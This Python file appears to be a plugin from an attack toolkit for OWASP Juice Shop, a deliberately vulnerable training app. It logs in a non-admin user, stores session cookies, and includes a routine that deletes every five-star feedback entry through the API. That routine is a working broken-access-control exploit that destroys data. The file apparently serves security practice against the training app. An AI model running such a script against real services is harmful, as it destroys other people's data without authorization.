"""
This file will create a login session using user that is not admin
It will then save the cookie to cookies.json
#################################################################3
Remark: You need to register a user before you run this code
Hint: You can use TASK REPETITIVE REGISTRATION
"""

from plugins import attack as a

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from plugins import test_repetitive_registration as usrReg
from plugins import test_admin_registration as admReg

class login(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.url = a.URL + '/rest/user/login'
        self.email = 'test368@gmail.com' #test327@gmail.com'
        self.password = '123456'

    def set_user(self):
        self.usr = usrReg.test_repetitive_registration()  ## this user is a normal user
        #self.usr = admReg.admin_registration()

    def set_info(self):
        self.email, self.password, self.id = self.usr.run()

    def generator(self,):
        json_data = {
            'email': self.email,
            'password': self.password,
        }
        return json_data

    def password_login(self):
        """
        This function is to login using Username and Password
        After successfully login, we will save the user credentials such as
        cookies and headers. Then in the following cases, we can login only using
        cookies and headers.
        """
        print("--------------------------------------")
        print("Now let us login using username " + self.email + " and password " + self.password)
        json_data = self.generator()
        response = self.juice_session.post(self.url, json=json_data)
        print(response.status_code)
        if response.status_code == 200:
            a.set_auth(self.email,response)
            a.set_basket_id(self.email,response)
        print(response.text)
        return response

    def credential_login(self, email):
        print("---------------------------------------------")
        print("Now let us login using cookie and header")
        print("Who am i")
        new_cookie, new_header = a.get_auth(email)

        response = self.juice_session.get(a.URL + '/rest/user/whoami',
                                          cookies=new_cookie, headers=new_header, verify=False)
        print("We can thus get our ID")
        userId = response.json()["user"]["id"]
        print(userId)
        print(response.status_code)
        print(response.text)
        return userId

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        logger = a.logging.getLogger("SQL_injection")
        a.logging.info(logger)
        a.logging.info('Started')
        self.set_user()  ## this is need if we do not have records of existing users.
        self.set_info()
        self.password_login()
        self.credential_login(email=self.email)
        a.logging.info('Finished')

    def delete_fiveStar(self):
        new_cookie, new_header = a.get_auth(self.email)
        response = self.juice_session.get(a.URL + '/api/Feedbacks/',
                                          cookies=new_cookie, headers=new_header, verify=False)
        print(response.text)
        delete_list = []
        for i in range(len(response.json()["data"])):
            item = response.json()["data"]
            if item[i]["rating"] == 5:
                delete_list.append(item[i]["id"])
        print(delete_list)

        for j in range(len(delete_list)):
            print(delete_list[j])
            res = self.juice_session.delete(a.URL + '/api/Feedbacks/{}'.format( str(delete_list[j]) ),
                                              cookies=new_cookie, headers=new_header, verify=False)
            print(res)

        ####check deleting
        response = self.juice_session.get(a.URL + '/api/Feedbacks/',
                                          cookies=new_cookie, headers=new_header, verify=False)
        fiveStar_list = []
        for i in range(len(response.json()["data"])):
            item = response.json()["data"]
            if item[i]["rating"] == 5:
                fiveStar_list.append(item[i]["id"])
        print( len(fiveStar_list) == 0)

